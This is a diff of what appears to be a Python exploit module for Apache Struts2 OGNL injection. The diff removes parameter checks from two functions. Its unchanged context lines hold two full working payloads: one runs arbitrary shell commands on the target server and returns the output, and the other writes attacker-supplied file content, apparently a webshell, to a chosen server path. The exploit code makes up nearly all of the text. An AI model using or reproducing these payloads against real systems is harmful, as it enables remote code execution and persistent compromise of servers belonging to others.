@@ -32,8 +32,6 @@ def prove(data):
 def exec(data=None):
     data = init(data, 'struts')
     if data['url'] != None:
-        if 'cmd' not in data.keys() :
-            raise Exception("None cmd ")
         cmd = data['cmd']
         exec_poc =  '''method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=%COMMAND%&pp=\\\\AAAA&ppp=%20&encoding=UTF-8'''
         headers = {}
@@ -53,10 +51,6 @@ def upload(data=None):
     data = init(data, 'struts')
     if data['url'] != None:
         upload_poc = '''method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23parameters.info1[0]),%23w.print(%23parameters.info2[0]),%23w.print(%23req.getContextPath()),%23w.close(),1?%23xx:%23request.toString&shellname=%PATH%&shellContent=%FILECONTENT%&encoding=UTF-8&pp=%2f&info1=oko&info2=kok%2f'''
-        if 'srcpath' not in data.keys() :
-            raise Exception("None srcpath ")
-        if 'despath' not in data.keys() :
-            raise Exception("None despath ")
         despath = data['despath']
         content = _read_file(data['srcpath'])
         headers =  {}
